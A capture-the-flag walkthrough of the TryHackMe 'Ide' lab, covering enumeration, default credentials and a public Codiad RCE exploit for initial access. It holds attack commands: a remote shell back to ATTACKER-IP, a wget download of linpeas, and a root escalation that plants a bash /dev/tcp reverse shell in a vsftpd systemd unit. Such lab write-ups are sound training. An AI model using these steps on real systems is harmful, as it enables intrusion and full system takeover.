# Ide Walkthrough
<br/>

## Intro
Welcome into the new Ide challenge, here is the link to the [web-page](https://tryhackme.com/r/room/ide) on TryHackMe.
To solve the room we will have to do some enumeration, looking scrupulously  everywhere, locate the vulnerability and exploit it to gain the initial access. Finally we will have to do a bit of privilege escalation to become root and read the flag.

Whenever you feel ready press "Start Machine" and connect via OpenVPN or use the AttackBox.

Let's do it!

<br/>
<br/>

## The Challenge
Let's begin with a port scan with *nmap*:
```bash
nmap -sV -p- MACHINE_IP
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

(my suggestion is to first do the quick scan on common ports, when you get the output you start investigating it, while at the same time you start the longer scan on all the ports)

Logging into the FTP server with the anonymous user and giving a looks around 
```bash
cd ...
```

```bash
get -
```

Reading the file we can understand that some passwords have been resetted and the guy suggest to use the default credentials.
So we know the username is `john` and for the default password i have tried some of the commons default ones and the top used, came out it is `password`, quite easy, but we could also brute force it.

Navigating to `http://ide.thm:62337/` we can notice it is running Codiad 2.8.4. With a quick search in exploitDB we can see there is an RCE exploit, here is the link to the GitHub [repo](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit).

We can clone the repository to our device:
```bash
git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
```

Now run the exploit inserting the target and your IP:
```bash
python3 exploit.py http://MACHINE_IP:62337/ john password ATTACKER-IP 62337 linux
```

Follow the instruction in the terminal and open up the listener and in a couple of seconds you will have the shell.

Looking around we can see that there is a  use called *drac*, so we need to login as this guy.

We can speed up things downloading *Linpeas* to the target machine, which will scan for some vulnerabilities, clear text creds and other vector to escalate our privileges.

If you do not have it installed do: `sudo apt install peass`, and copy the .sh file in the current working directory with:
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
```

On your machine, in the directory with the linpeas.sh file we can create a simple python server:
```bash
python3 -m http.server
```

On the target navigate to the `/tmp` directory and download the script:
```bash
cd /tmp
```
```bash
wget http://ATTACKER-IP:8000/linpeas.sh
```

Now make the file executable and run it:
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh
```

Reading trough the tool's report we can see that the poor Drac has its password exposed at:
```
/home/drac/.bash_history:mysql -u drac -p 'Th3dRaCULa1sR3aL'      
```

Now we can either change use with `su drac` if you have upgraded the reverse-shell or SSH as him.
If you chose SSH method:
```bash
ssh drac@MACHINE_IP
```

If you want to upgrade the current revserse-hell follow this [guide](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/16131058b9089c6a11aa80f90378237b33199d47/Tips-%26-Resources/Reverse_Shell-Upgrade.md).

Once logged in we can get our first flag:
```bash
cat /home/drac/user.txt
```

<br/>

### Privilege Escalation
The last objective is to gain the root access to get the flag, lets do it!

We can check what we can run as `sudo` with drac user:
```bash
sudo -l
```
We get this output:
```
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

This means that we can run as super user the command to restart the FTP server.

To exploit it we have to find the config file first:
```bash
find / -name "*vsftpd*"
```

I found there are 2 locations, but checking the files permissions we are allowed to modify only the second one:
```
/lib/systemd/system/vsftpd.service
/etc/systemd/system/multi-user.target.wants/vsftpd.service
```

Now we can make some changes:
```bash
nano /etc/systemd/system/multi-user.target.wants/vsftpd.service
```

```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/1234 0>&1'

[Install]
WantedBy=multi-user.target

```
Basically we are only modifying line 9, this way when the service start will make a connection to our machine and, since we are restarting the service as super user, we will be logged in as root.


Reload the daemon:
```bash
systemctl daemon-reload
```

Everything looks ready, on our machine we can start a listener:
```bash
nc -lvnp 1234
```

And on the target finally execute as sudo the command:
```bash
sudo /usr/sbin/service vsftpd restart
```

Finally we can get the flag
```bash
cat /root/root.txt
```

<br/>
<br/>

Congratulations you have successfully pwnded the Ide machine.

Catch you in the next CTF 😃
